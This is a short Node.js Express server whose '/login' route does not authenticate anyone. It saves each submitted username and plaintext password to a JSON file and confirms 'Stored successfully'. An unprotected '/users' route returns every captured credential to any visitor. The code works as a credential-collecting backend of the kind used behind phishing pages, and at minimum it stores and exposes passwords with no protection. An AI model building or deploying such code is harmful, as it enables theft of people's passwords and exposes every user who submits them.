const express = require("express");
const fs = require("fs");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

// File location
const USERS_FILE = path.join(__dirname, "users.json");

// Create users.json if it doesn't exist
if (!fs.existsSync(USERS_FILE)) {
    fs.writeFileSync(USERS_FILE, "[]");
}

// Middleware
app.use(express.json());
app.use(express.static("public"));

/*
-----------------------------------
HOME PAGE
-----------------------------------
*/
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "index.html"));
});

/*
-----------------------------------
SAVE LOGIN DATA
-----------------------------------
*/
app.post("/login", (req, res) => {

    try {

        const { username, password } = req.body;

        if (!username || !password) {
            return res.status(400).json({
                success: false,
                message: "Username and password required"
            });
        }

        let users = JSON.parse(
            fs.readFileSync(USERS_FILE, "utf8")
        );

        users.push({
            username,
            password,
            time: new Date().toISOString()
        });

        fs.writeFileSync(
            USERS_FILE,
            JSON.stringify(users, null, 2)
        );

        console.log("New entry saved:");
        console.log(username);

        res.json({
            success: true,
            message: "Stored successfully"
        });

    } catch (error) {

        console.error(error);

        res.status(500).json({
            success: false,
            message: "Server error"
        });
    }
});

/*
-----------------------------------
VIEW ALL STORED DATA
-----------------------------------
*/
app.get("/users", (req, res) => {

    try {

        const users = JSON.parse(
            fs.readFileSync(USERS_FILE, "utf8")
        );

        res.json(users);

    } catch (error) {

        console.error(error);

        res.status(500).json({
            success: false,
            message: "Unable to read users"
        });
    }
});

/*
-----------------------------------
START SERVER
-----------------------------------
*/
app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
});